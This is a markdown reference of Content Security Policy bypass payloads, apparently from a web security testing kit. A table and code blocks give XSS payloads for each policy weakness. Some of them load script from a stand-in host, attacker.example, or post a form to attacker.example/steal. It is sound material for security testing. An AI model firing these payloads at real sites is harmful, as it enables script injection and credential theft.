# CSP bypass payloads

Use these to test whether a *found* CSP actually blocks execution. A policy
that allows any of the following is a bypass, and the finding should be
reported at the severity of the XSS it fails to stop.

## Policy weakness → payload

| Weakness in `script-src` | Payload that fires |
|---|---|
| `'unsafe-inline'` | `<script>alert(1)</script>` (and every inline-handler payload in xss.md) |
| `'unsafe-eval'` | `eval("alert(1)")` (needs an inline script or sink to call it) |
| `data:` | `<script src="data:text/javascript,alert(1)"></script>` |
| `https:` or `http:` scheme | `<script src="https://attacker.example/x.js"></script>` |
| wildcard `*` | same as above |
| allowlisted host with a JSONP endpoint | `<script src="https://allowlisted.example/api?callback=alert"></script>` |

## Missing-directive bypasses (the classic trio)

- **No `object-src 'none'`** — objects ignore `script-src`:
  ```html
  <object data="data:text/html,<script>alert(1)</script>"></object>
  <embed src="data:text/html,<script>alert(1)</script>">
  ```
- **No `base-uri 'none'`** — redirect relative loads to the attacker:
  ```html
  <base href="https://attacker.example/">
  <script src="/app.js"></script>   <!-- now loads attacker's app.js -->
  ```
- **No `form-action 'self'`** — phishing / credential redirection:
  ```html
  <form action="https://attacker.example/steal" method="POST">
  ```

## Note on `frame-ancestors` vs `X-Frame-Options`

`frame-ancestors` overrides XFO in modern browsers; test with
`<iframe src="target">` from an attacker origin. Missing both = clickjacking
surface, not a script-execution bypass — classify separately.

## Reporting rule

Only claim "CSP bypassed" when the payload actually executes in the app's
policy. If the policy blocks everything you throw at it, that's evidence for
a WARNING → INFO downgrade of the original XSS finding — record what you
tried.

## Fix reference

See `fixes/csp.md` for a strict policy template and per-framework serving
notes.
